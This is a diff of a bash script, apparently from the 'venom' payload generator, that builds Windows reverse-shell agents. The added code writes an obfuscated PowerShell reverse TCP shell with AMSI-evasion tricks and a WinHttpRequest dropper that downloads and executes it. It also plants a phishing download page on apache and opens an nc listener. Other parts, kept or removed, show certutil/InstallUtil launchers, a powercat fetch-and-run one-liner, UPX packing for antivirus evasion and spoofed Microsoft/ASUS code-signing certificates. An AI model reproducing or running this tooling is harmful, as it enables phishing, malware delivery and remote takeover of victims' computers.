@@ -11764,36 +11764,27 @@ cat << !
 
     AGENT Nº1
     ╔──────────────────────────────────────────────────────────────
-    | AGENT EXTENSION    : EXE
-    | LAUNCHER EXTENSION : BAT
-    | LOLBin             : certutil|InstallUtil
+    | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | DESCRIPTION        : Simple TCP reverse shell in C (compiled to exe)
+    | LOLBin             : WinHttpRequest
+    | AGENT EXTENSION    : PS1
+    | DROPPER EXTENSION  : PS1
 
     AGENT Nº2
     ╔──────────────────────────────────────────────────────────────
+    | DESCRIPTION        : Reverse TCP Python Shell
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | LOLBin             : Powershell (Net.WebClient)
     | AGENT EXTENSION    : EXE|PY
-    | LAUNCHER EXTENSION : BAT|--
-    | LOLBin             : certutil
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10) - Linux (agent.py)
-    | DESCRIPTION        : Simple TCP reverse shell in PYTHON (compiled to exe)
+    | DROPPER EXTENSION  : BAT|--
 
-    AGENT Nº3
+    AGENT Nº3:
     ╔──────────────────────────────────────────────────────────────
-    | AGENT EXTENSION    : PS1
-    | LAUNCHER EXTENSION : BAT
-    | LOLBin             : certutil|WinHttpRequest
+    | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | DESCRIPTION        : Simple TCP reverse shell in PS1 (powercat.ps1)
-
-    AGENT Nº4:
-    ╔──────────────────────────────────────────────────────────────
-    | AGENT EXTENSION    : PS1
-    | LAUNCHER EXTENSION : BAT
     | LOLBin             : certutil|WinHttpRequest
-    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | DESCRIPTION        : Simple TCP reverse shell in PS1 (agent.ps1)
-
+    | AGENT EXTENSION    : PS1
+    | DROPPER EXTENSION  : BAT
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -11810,7 +11801,6 @@ case $choice in
 1) sh_evasion1 ;;
 2) sh_evasion2 ;;
 3) sh_evasion3 ;;
-4) sh_evasion4 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
@@ -11820,14 +11810,21 @@ esac
 
 
 
-# ---------------------------------------------
-# Simple TCP reverse shell in C compiled to exe
-# ---------------------------------------------
+# ----------------------------------------------
+# Reverse TCP Powershell Shell + WinHttpRequest 
+# ----------------------------------------------
 sh_evasion1 () {
 Colors;
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="666";fi
+if [ -z "$Drop" ]; then Drop="dropper";fi
+if [ -z "$NaM" ]; then NaM="revshell";fi
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
@@ -11835,147 +11832,86 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    LOLBin   : certutil|InstallUtil
-    LAUNCHER : $IPATH/output/$NaM.bat
-    AGENT    : $IPATH/output/$NaM.exe
-
+    LOLBin   : WinHttpRequest
+    DROPPER  : $IPATH/output/$Drop.ps1
+    AGENT    : $IPATH/output/$NaM.ps1
 !
 echo "---"
 
 
-## BUILD LAUNCHER
-echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
-sleep 2
-## TODO: check if it connects back
-# OBFUSCATE SYSCALLS (evade AV/AMSI)
-# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
-# ---
-# echo "@echo off" > $IPATH/output/Launcher.bat
-# echo "sEt !h=f" >> $IPATH/output/Launcher.bat
-# echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
-# echo "@cErt^uT%OKEN%il.ex%it%e -u%TOKEN%rl%(0..3)%cache -sp%+%lit -%!h% http://$lhost/$NaM.exe $NaM.exe && pC%USER%a^lUa -a $NaM.exe" >> $IPATH/output/Launcher.bat
-# echo "exit" >> $IPATH/output/Launcher.bat
-# ---
-# Parse ip addr (split lhost)
-one=$(echo $lhost | cut -d '.' -f1,2)
-two=$(echo $lhost | cut -d '.' -f3,4)
-echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;sEt i0=f&&sEt T0=$one&&sEt NULL=$two&&@e%!%ch^O please wait, installing software.&&@cErt^uT%OKEN%il.ex%HUB%e -u%TOKEN%rl%[0..3]%ca%F%che -sp%d0b%lit -%i0% http://%T0%.%NULL%/$NaM.exe $NaM.exe),) %i% ,,)&&(,(;C:\Windows\Microsoft.NET\Framework\\\\v4.0.30319\Install%_init_%Util.ex%HUSBAND%e /log^fi%na%le= /Log%FILE%To%_i_%Console=false /U $NaM.exe),)&&eXit" > $IPATH/output/$NaM.bat
+## BUILD DROPPER
+echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
+echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 
 
-## COMPILE C Program
-# TODO: rename binary.exe to binary.jpg (IN CMD: start binary.jpg)
-echo "${BlueF}[☠]${white} Compiling C Program (tcp_reverse_shell) .."${Reset};
-sleep 2
-cd $IPATH/templates/evasion1
-chmod +x compile.sh > /dev/nul 2>&1
-sed "s|IpAdDr|$lhost|g" auto.c > shell1.c
-sed "s|LpOrT|$lport|g" shell1.c > shell.c
-xterm -T " COMPILING - tcp_reverse_shell" -geometry 110x23 -e "./compile.sh shell && sleep 1"
+## Build Reverse Powershell Shell
+echo "${BlueF}[☠]${white} Building Reverse Powershell Shell ..${white}";sleep 2
+echo "<#" > $IPATH/output/$NaM.ps1
+echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Original shell: @ZHacker13" >> $IPATH/output/$NaM.ps1
+echo "#>" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "\$MethodInvocation = \"gnidocnEiicsA.txeT.metsyS\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
+echo "\$NewObjectCommand = (\$Constructor -Join '');\$icmpv6 = \"StreamWriter\";\$assembly = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
+echo "\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \$null){exit 1};\$stream = \$socket.GetStream();" >> $IPATH/output/$NaM.ps1
+echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
+echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
+echo "do{" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Write(\"> \");" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
+echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
+echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
+echo "	\$out = \$comm.GetString(\$buffer, 0, \$read).Replace(\"\`r\`n\",\"\").Replace(\"\`n\",\"\");" >> $IPATH/output/$NaM.ps1
+echo "	if(!\$out.equals(\"exit\")){" >> $IPATH/output/$NaM.ps1
+echo "		\$out = \$out.split(' ')" >> $IPATH/output/$NaM.ps1
+echo "	        \$res = [string](&\$out[0] \$out[1..\$out.length]);" >> $IPATH/output/$NaM.ps1
+echo "		if(\$res -ne \$null){ \$writer.WriteLine(\$res)};" >> $IPATH/output/$NaM.ps1
+echo "	}" >> $IPATH/output/$NaM.ps1
+echo "}While (!\$out.equals(\"exit\"))" >> $IPATH/output/$NaM.ps1
+echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 
-## check for UPX installation
-upx_packer=`which upx`
-if ! [ "$?" -eq "0" ]; then
-  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 2
-  echo "" && sudo apt-get install upx-ucl && echo ""
-fi
 
-
-## AV evasion (pack binary)
-echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
-echo ""
-upx -9 -v -o $NaM.exe shell.exe
-mv $NaM.exe $IPATH/output/$NaM.exe > /dev/nul 2>&1
-echo ""
-
-
-## check for CarbonCopy dependencies
-# sign executale binary with ssl
-ossl_packer=`which osslsigncode`
-if ! [ "$?" -eq "0" ]; then
-  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
-  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
-fi
-
-
-## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
-echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 1
-# random produces a number from 1 to 6
-conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
-# if $conv number output 'its small than' number 3 ...
-if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
-echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};
-sleep 2
-cd $IPATH/obfuscate
-xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
-mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
-rm -r certs > /dev/nul 2>&1
-chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
-cd $IPATH/
-
-
-### change executable icon
-wine_c=$(cat $IPATH/settings|grep -m 1 'WINE_DRIVEC'|cut -d '=' -f2)
-RhI="$wine_c/Program Files/Resource Hacker/ResourceHacker.exe"
-if [ "$ArCh" = "x64" ]; then
-   RhI="$wine_c/Program Files (x86)/Resource Hacker/ResourceHacker.exe"
-fi
-if [ -f "$RhI" ]; then
-    echo "${BlueF}[☠]${white} Changing $NaM.exe icon (ResourceHacker) .."${Reset};
-    sleep 2
-
-    IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "dropbox.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Steam-logo.ico" FALSE "Windows-black.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
-    if [ "$IcOn" = "Input your own icon" ]; then
-      ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
-      PaTh="$ImR"
-    else
-      PaTh="$IPATH/bin/icons/$IcOn"
-    fi
-    xterm -T "VENOM - RH change binary icon" -geometry 110x23 -e "$arch \"$RhI\" -open \"$IPATH/output/$NaM.exe\" -save \"$IPATH/output/$NaM.exe\" -action addskip -res \"$PaTh\" -mask ICONGROUP,MAINICON, && sleep 1"
-else
-    echo "${RedF}[x]${white} ResourceHacker.exe '->' not found!"${Reset};
-    sleep 1
-    # Installing Resource-Hacker.exe under wine ..
-    xterm -T "VENOM - Installing Module Dependencies" -geometry 110x23 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
-    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please wait, restarting tool .."${Reset};
-    exit
-fi
+## Building Phishing webpage
+cd $IPATH/templates/phishing
+echo "${BlueF}[☠]${white} Building Downloader webpage .."${Reset};sleep 2
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
 
 
 ## Copy files to apache2 webroot
-echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
-chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
-cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
-cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
+cd $IPATH/output
+zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Porting files required to apache2 .."${Reset};sleep 2
+cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
 
 
-## Phishing webpage
-cd $IPATH/templates/phishing
-sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
-cd $IPATH
-## Final displays to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
-sleep 2
 
-
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
 ## START HANDLER
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
-echo "---"
 sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
-rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
-rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
-rm $IPATH/templates/evasion1/shell.o > /dev/nul 2>&1
-rm $IPATH/templates/evasion1/shell.base > /dev/nul 2>&1
-rm $IPATH/templates/evasion1/shell1.c > /dev/nul 2>&1
-rm $IPATH/templates/evasion1/shell.c > /dev/nul 2>&1
-rm $IPATH/templates/evasion1/shell.exe > /dev/nul 2>&1
+# rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 sh_menu
 }
 
@@ -11984,6 +11920,7 @@ sh_menu
 
 # --------------------------------------------------
 # Simple TCP reverse shell in PYTHON compiled to exe
+# Author: @Rel1k
 # --------------------------------------------------
 sh_evasion2 () {
 Colors;
@@ -11993,17 +11930,15 @@ NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry 
 
 ## display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
-echo "---"
-echo ${BlueF}
+echo "${BlueF}---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : certutil
-    LAUNCHER : $IPATH/output/$NaM.bat
+    DROPPER  : $IPATH/output/$NaM.bat
     AGENT    : $IPATH/output/$NaM.exe
-
 !
-echo "---"
+echo "---${white}"
 
 
 ## BUILD LAUNCHER
@@ -12072,16 +12007,13 @@ sleep 2
 ## check UPX dependencie
 upx_packer=`which upx`
 if ! [ "$?" -eq "0" ]; then
-  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 2
+  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 3
   echo "" && sudo apt-get install upx-ucl && echo ""
+else
+  ## AV evasion (pack binary with UPX)
+  echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
+  upx -9 -v -o $NaM.exe Client_Shell.exe > /dev/null 2>&1
 fi
-
-
-## AV evasion (pack binary with UPX)
-echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
-echo ""
-upx -9 -v -o $NaM.exe Client_Shell.exe
-echo ""
 
 
 ## Make sure CarbonCopy dependencies are installed
@@ -12093,13 +12025,12 @@ fi
 
 
 ## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
-echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 1
+echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 2
 # random produces a number from 1 to 6
 conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
 # if $conv number output 'its small than' number 3 ...
 if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
-echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};
-sleep 2
+echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
 cd $IPATH/obfuscate
 xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
 mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
@@ -12124,20 +12055,20 @@ mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
 cd $IPATH
 
 
-## Final displays to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
-sleep 2
-cd $IPATH
-
-
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
 ## START HANDLER
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
-echo "---"
-sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
 rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
 rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
@@ -12145,80 +12076,10 @@ sh_menu
 }
 
 
-
-
-# --------------------------------------------------
-# Simple TCP reverse shell in PYTHON compiled to exe
-# -------------------------------------------------
-sh_evasion3 () {
-## TODO: msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=666 --encrypt rc4 --encrypt-key thisisakey -f c -o chars.raw
-# https://gist.github.com/r00t-3xp10it/fc690dc4abb20858e469d8df8ceb19b2#gistcomment-2952073
-Colors;
-lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
-
-## display final settings to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
-echo "---"
-echo ${BlueF}
-cat << !
-    LPORT    : $lport
-    LHOST    : $lhost
-    LOLBin   : certutil
-    LAUNCHER : $IPATH/output/$NaM.bat
-    AGENT    : $IPATH/obfuscate/evasion/powercat.ps1
-
-!
-echo "---"
-
-
-## LAUNCHER
-# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/powercat.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;powercat -c $lhost -p $lport -e cmd
-echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
-sleep 2
-echo "@echo off&&powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p $lport -e cmd\"&&exit" > $IPATH/output/$NaM.bat
-
-
-## Copy files to apache2 webroot
-echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
-cp $IPATH/templates/evasion3/powercat.ps1 $ApAcHe/powercat.ps1 > /dev/nul 2>&1
-cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
-
-
-## Phishing webpage
-cd $IPATH/templates/phishing
-sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
-cd $IPATH
-
-
-## Final displays to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};sleep 2
-cd $IPATH
-
-
-## START HANDLER
-xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
-echo "---"
-sleep 2
-
-
-## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
-rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
-rm $ApAcHe/mega1.html > /dev/nul 2>&1
-rm $ApAcHe/powercat.ps1 > /dev/nul 2>&1
-sh_menu
-}
-
-
-
-
 # -------------------------------------------
 # Simple TCP reverse shell in PS1 (agent.ps1)
 # -------------------------------------------
-sh_evasion4 () {
+sh_evasion3 () {
 Colors;
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
@@ -12231,14 +12092,14 @@ cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : certutil
-    LAUNCHER : $IPATH/output/$NaM.bat
+    DROPPER  : $IPATH/output/$NaM.bat
     AGENT    : $IPATH/output/$NaM.ps1
 !
-echo "---"
+echo "---${white}"
 
 
 ## parsing ip addr ranges into fields (payload.ps1)
-echo "${BlueF}[☠]${white} parsing ip addr ranges into fields .."${Reset};
+echo "${BlueF}[☠]${white} parsing ip addr ranges into fields .."${Reset};sleep 2
 sleep 2
 one=$(echo $lhost|cut -d '.' -f1)
 two=$(echo $lhost|cut -d '.' -f2)
@@ -12249,8 +12110,7 @@ splt1=$(echo $lhost | cut -d '.' -f1,2)
 splt2=$(echo $lhost | cut -d '.' -f3,4)
 
 ## convert all ip ranges fields into hex (payload.ps1)
-echo "${BlueF}[☠]${white} convert ip ranges fields into hex .."${Reset};
-sleep 2
+echo "${BlueF}[☠]${white} convert ip ranges fields into hex .."${Reset};sleep 2
 loot=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
 echo "${BlueF}[${YellowF}i${BlueF}]${white} ip${RedF}:${white}$lhost ${YellowF}=>${white} hex${RedF}:${white}$loot"${Reset};
 sleep 2
@@ -12263,8 +12123,7 @@ qua=$(echo $loot|cut -d ',' -f4)
 
 
 ## inject obfuscated (hex) ip addr into template (payload.ps1)
-echo "${BlueF}[☠]${white} inject obfuscated (hex) addr into payload .."${Reset};
-sleep 2
+echo "${BlueF}[☠]${white} inject obfuscated (hex) addr into payload .."${Reset};sleep 2
 cd $IPATH/templates/evasion4
 cp powershell.ps1 powershell.bak
 sed -i "s|rEp|$um|" powershell.ps1
@@ -12280,8 +12139,7 @@ mv powershell.bak powershell.ps1 > /dev/nul 2>&1
 
 
 ## LAUNCHER (launcher.bat)
-echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
-sleep 2
+echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
 # echo "@echo off&&powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$NaM.ps1')" > $IPATH/output/$NaM.bat
 # echo "@echo off&&certutil.exe -urlcache -split -f http://$lhost/$NaM.ps1 $NaM.ps1 && start $NaM.ps1" > $IPATH/output/$NaM.bat
 # $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/$NaM.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;Start-Process -FilePath "./$NaM.ps1" -Wait -WindowStyle Minimized
@@ -12297,25 +12155,27 @@ cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
 
 ## Phishing webpage
 cd $IPATH/templates/phishing
+echo "${BlueF}[☠]${white} Building Downloader webpage .."${Reset};sleep 2
 sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
 mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
 cd $IPATH
 
 
-## Final displays to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
-sleep 2
-cd $IPATH
 
-
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
 ## START HANDLER
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lnvp $lport"
-echo "---"
-sleep 2
 
 
 ## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
@@ -12776,7 +12636,6 @@ cat << !
     | AGENT EXTENSION    : PHP + SH (unix_exploit)
     | AGENT EXECUTION    : http://$IP/trigger.sh
     | DETECTION RATIO    : https://goo.gl/wGgZtC
-
 
 
     ╔─────────────────────────────────────────────────────────────╗
